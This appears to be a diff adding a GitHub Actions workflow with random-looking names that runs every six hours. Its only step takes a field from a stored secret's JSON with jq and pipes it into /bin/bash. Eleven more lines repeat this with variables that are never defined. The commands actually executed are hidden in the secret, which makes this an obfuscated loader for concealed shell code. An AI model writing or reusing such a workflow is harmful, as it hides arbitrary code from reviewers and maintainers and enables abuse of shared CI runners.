@@ -1,0 +1,28 @@
+name: zhuweixi6981
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuweixi6981
+        env:
+          bjqqg20443: ${{ secrets.bjqqg20443 }}
+        run: |
+          echo $bjqqg20443 | jq -r .pq0 | /bin/bash
+          echo $xxfky4 | jq -r .ltxbq0 | /bin/bash
+          echo $mm0 | jq -r .vm68198 | /bin/bash
+          echo $f97876 | jq -r .tv75 | /bin/bash
+          echo $zuen3 | jq -r .hyh682 | /bin/bash
+          echo $y53599 | jq -r .rqvq388 | /bin/bash
+          echo $ue65 | jq -r .f11311 | /bin/bash
+          echo $wbz40192 | jq -r .pgjny6250 | /bin/bash
+          echo $ur80617 | jq -r .b2192 | /bin/bash
+          echo $csrum1604 | jq -r .e886 | /bin/bash
+          echo $g4924 | jq -r .y7727 | /bin/bash
+          echo $ynwu660 | jq -r .aaram171 | /bin/bash
+
